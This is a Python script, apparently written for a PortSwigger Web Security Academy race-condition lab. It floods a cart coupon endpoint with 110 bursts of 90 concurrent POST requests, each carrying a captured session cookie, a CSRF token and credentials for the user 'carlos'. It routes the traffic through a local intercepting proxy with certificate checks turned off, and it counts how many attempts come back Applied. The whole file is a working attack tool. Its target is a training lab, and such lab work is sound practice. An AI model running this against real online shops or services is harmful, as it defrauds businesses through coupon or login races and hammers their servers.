# burst_race_test.py
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter
import time
import warnings
import urllib3

warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0abd003d04b0539080a7fd340052002b.web-security-academy.net/cart/coupon"

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://0aea00b704d0401681500213006500a6.web-security-academy.net",
    "Referer": "https://0aea00b704d0401681500213006500a6.web-security-academy.net/cart",
}

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

cookies = {
    "session": "Xk0k5wm1ZmPaPWMdlOmkS4rdoLyzYj9n"
}

data = {
    "csrf": "e4lKrrxShInSc40JKT7w5qV2bzNFpSLy",
    "username": "carlos",
    "password" : ""
}

BURST_SIZE = 90
BURST_COUNT = 110
INTER_BURST_SLEEP = 0

TIMEOUT = 15

def send_one(req_id):
    try:
        resp = requests.post(
            url,
            headers=headers,
            cookies=cookies,
            data=data,
            timeout=TIMEOUT,
            proxies=proxies,
            verify=False
        )
        body = resp.content.decode("utf-8", errors="replace")
        if "Invalid" in body:
            outcome = "Invalid"
        elif "applied" in body or "Applied" in body:
            outcome = "Applied"
        else:
            outcome = "Valid"

        return (req_id, outcome, resp.status_code)

    except requests.RequestException as e:
        return (req_id, "Error", str(e))

def run_bursts():
    burst_index = 0
    global_start = time.time()
    overall_counter = Counter()
    try:
    	
        while True:
            if BURST_COUNT is not None and burst_index >= BURST_COUNT:
                break

            burst_index += 1
            burst_start = time.time()
            results = []

            with ThreadPoolExecutor(max_workers=BURST_SIZE) as exe:
                futures = {exe.submit(send_one, i): i for i in range(BURST_SIZE)}
                for fut in as_completed(futures):
                    req_id, outcome, status = fut.result()
                    results.append(outcome)
                    overall_counter.update([outcome])

                # print(f"burst -> {burst_index}")

            burst_elapsed = time.time() - burst_start
            time.sleep(INTER_BURST_SLEEP)

        total_elapsed = time.time() - global_start
        print("\n=== All bursts finished ===")
        print(f"Bursts run: {burst_index}")
        print("Overall summary:")
        for k, v in overall_counter.items():
            print(f"{k}: {v}")
        print(f"Total time: {total_elapsed:.2f}s")

    except KeyboardInterrupt:
        print("\nInterrupted by user. Summary so far:")
        for k, v in overall_counter.items():
            print(f"{k}: {v}")

if __name__ == "__main__":
    run_bursts()
